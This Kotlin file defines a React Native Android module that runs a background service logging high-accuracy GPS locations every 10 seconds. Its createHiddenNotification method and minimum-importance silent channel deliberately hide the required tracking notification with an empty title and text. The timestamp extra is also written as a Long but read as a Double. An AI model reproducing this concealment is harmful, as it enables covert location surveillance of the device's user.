// TrackingModule.kt
package com.cogniant.Notifi // Update this to match your actual package name

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.location.Location
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.PowerManager
import android.util.Log
import androidx.core.app.NotificationCompat
import com.facebook.react.HeadlessJsTaskService
import com.facebook.react.bridge.Arguments
import com.facebook.react.bridge.Promise
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContextBaseJavaModule
import com.facebook.react.bridge.ReactMethod
import com.facebook.react.bridge.WritableMap
import com.facebook.react.jstasks.HeadlessJsTaskConfig
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import java.util.concurrent.TimeUnit

class TrackingModule(private val reactContext: ReactApplicationContext) : ReactContextBaseJavaModule(reactContext) {
    companion object {
        private const val TAG = "TrackingModule"
        private const val MODULE_NAME = "TrackingModule"
        private const val CHANNEL_ID = "location_service_channel"
        private const val NOTIFICATION_ID = 9999
        
        // Shared preference keys
        private const val PREFS_NAME = "LocationTrackingPrefs"
        private const val KEY_IS_TRACKING = "isTracking"
        private const val KEY_LATITUDE = "latitude"
        private const val KEY_LONGITUDE = "longitude"
        private const val KEY_TIMESTAMP = "timestamp"
        
        // Static variables for access from service
        @JvmStatic private var lastLatitude = 0.0
        @JvmStatic private var lastLongitude = 0.0
        @JvmStatic private var lastTimestamp = 0L
        
        // Method to save location that can be called from service
        @JvmStatic
        fun updateLocation(context: Context, latitude: Double, longitude: Double) {
            // Update static variables
            lastLatitude = latitude
            lastLongitude = longitude
            lastTimestamp = System.currentTimeMillis()
            
            // Save to preferences
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            prefs.edit().apply {
                putString(KEY_LATITUDE, latitude.toString())
                putString(KEY_LONGITUDE, longitude.toString())
                putLong(KEY_TIMESTAMP, lastTimestamp)
                apply()
            }
            
            Log.d(TAG, "Location updated: $latitude, $longitude")
        }
    }
    
    override fun getName(): String = MODULE_NAME
    
    @ReactMethod
    fun startTracking(promise: Promise) {
        try {
            // Check if already tracking
            val prefs = reactContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val isTracking = prefs.getBoolean(KEY_IS_TRACKING, false)
            
            if (isTracking) {
                promise.resolve("Already tracking")
                return
            }
            
            // Mark as tracking
            prefs.edit().putBoolean(KEY_IS_TRACKING, true).apply()
            
            // Start the foreground service
            val serviceIntent = Intent(reactContext, LocationService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                reactContext.startForegroundService(serviceIntent)
            } else {
                reactContext.startService(serviceIntent)
            }
            
            promise.resolve("Tracking started")
        } catch (e: Exception) {
            promise.reject("ERROR", "Failed to start tracking: ${e.message}")
        }
    }
    
    @ReactMethod
    fun stopTracking(promise: Promise) {
        try {
            // Mark as not tracking
            val prefs = reactContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            prefs.edit().putBoolean(KEY_IS_TRACKING, false).apply()
            
            // Stop the service
            val serviceIntent = Intent(reactContext, LocationService::class.java)
            reactContext.stopService(serviceIntent)
            
            promise.resolve("Tracking stopped")
        } catch (e: Exception) {
            promise.reject("ERROR", "Failed to stop tracking: ${e.message}")
        }
    }
    
    @ReactMethod
    fun getTrackingStatus(promise: Promise) {
        try {
            // Get tracking state from preferences
            val prefs = reactContext.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val isTracking = prefs.getBoolean(KEY_IS_TRACKING, false)
            val latitude = prefs.getString(KEY_LATITUDE, "0.0")?.toDoubleOrNull() ?: 0.0
            val longitude = prefs.getString(KEY_LONGITUDE, "0.0")?.toDoubleOrNull() ?: 0.0
            val timestamp = prefs.getLong(KEY_TIMESTAMP, 0L)
            
            val result = Arguments.createMap().apply {
                putBoolean("isTracking", isTracking)
                putDouble("latitude", latitude)
                putDouble("longitude", longitude)
                putDouble("timestamp", timestamp.toDouble())
            }
            promise.resolve(result)
        } catch (e: Exception) {
            promise.reject("ERROR", "Failed to get tracking status: ${e.message}")
        }
    }
    
    // Location service that will run in the foreground
    class LocationService : Service() {
        private lateinit var fusedLocationClient: FusedLocationProviderClient
        private lateinit var locationCallback: LocationCallback
        private var wakeLock: PowerManager.WakeLock? = null
        private var isServiceRunning = false
        
        override fun onCreate() {
            super.onCreate()
            
            fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
            
            locationCallback = object : LocationCallback() {
                override fun onLocationResult(locationResult: LocationResult) {
                    for (location in locationResult.locations) {
                        handleLocationUpdate(location)
                    }
                }
            }
            
            // Create notification channel for Android 8+
            createNotificationChannel()
        }
        
        override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
            if (isServiceRunning) {
                return START_STICKY
            }
            
            // Start as a foreground service with a notification
            startForeground(NOTIFICATION_ID, createHiddenNotification())
            
            // Acquire partial wake lock
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "LocationService::WakeLock"
            )
            wakeLock?.acquire(TimeUnit.HOURS.toMillis(2)) // 2 hour timeout as safety measure
            
            // Request location updates
            startLocationUpdates()
            
            isServiceRunning = true
            return START_STICKY
        }
        
        private fun createNotificationChannel() {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    CHANNEL_ID,
                    "Location Service Channel",
                    NotificationManager.IMPORTANCE_MIN // Minimum importance = no sound, no visual interruption
                ).apply {
                    description = "Used for background location tracking"
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                }
                
                val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                notificationManager.createNotificationChannel(channel)
            }
        }
        
        private fun createHiddenNotification(): Notification {
            // Create an empty pending intent - it doesn't need to do anything
            val pendingIntent = PendingIntent.getActivity(
                this,
                0,
                Intent(), // Empty intent
                PendingIntent.FLAG_IMMUTABLE
            )
            
            return NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("") // Empty title
                .setContentText("") // Empty text
                .setSmallIcon(android.R.drawable.ic_menu_mylocation) // Required, but use a small system icon
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setSilent(true)
                .build()
        }
        
        private fun startLocationUpdates() {
            try {
                val locationRequest = LocationRequest.Builder(10000) // 10 seconds
                    .setPriority(Priority.PRIORITY_HIGH_ACCURACY)
                    .setMinUpdateDistanceMeters(5f) // 5 meters
                    .setMaxUpdateDelayMillis(60000) // Maximum delay of 1 minute
                    .build()
                
                fusedLocationClient.requestLocationUpdates(
                    locationRequest,
                    locationCallback,
                    Looper.getMainLooper()
                )
                
                // Also get a single update immediately
                fusedLocationClient.lastLocation.addOnSuccessListener { location ->
                    if (location != null) {
                        handleLocationUpdate(location)
                    }
                }
            } catch (e: SecurityException) {
                Log.e(TAG, "Location permission not granted", e)
            }
        }
        
        private fun handleLocationUpdate(location: Location) {
            // Update location in companion object
            updateLocation(this, location.latitude, location.longitude)
            
            // Start a headless JS task to notify React Native if needed
            val serviceIntent = Intent(applicationContext, LocationUpdateTaskService::class.java)
            serviceIntent.putExtra("latitude", location.latitude)
            serviceIntent.putExtra("longitude", location.longitude)
            serviceIntent.putExtra("timestamp", System.currentTimeMillis())
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                applicationContext.startForegroundService(serviceIntent)
            } else {
                applicationContext.startService(serviceIntent)
            }
        }
        
        override fun onBind(intent: Intent?): IBinder? = null
        
        override fun onDestroy() {
            super.onDestroy()
            
            // Stop location updates
            fusedLocationClient.removeLocationUpdates(locationCallback)
            
            // Release wake lock if it's still held
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
            
            isServiceRunning = false
        }
    }
    
    // Headless JS task service for notifying React Native from the background
    class LocationUpdateTaskService : HeadlessJsTaskService() {
        override fun getTaskConfig(intent: Intent): HeadlessJsTaskConfig? {
            val extras = intent.extras
            
            return if (extras != null) {
                val params = Arguments.createMap().apply {
                    putDouble("latitude", extras.getDouble("latitude", 0.0))
                    putDouble("longitude", extras.getDouble("longitude", 0.0))
                    putDouble("timestamp", extras.getDouble("timestamp", 0.0))
                }
                
                // This task will wake up JS to handle the location update
                // Timeout of 5 seconds
                HeadlessJsTaskConfig("LocationUpdateTask", params, 5000, true)
            } else {
                null
            }
        }
    }
}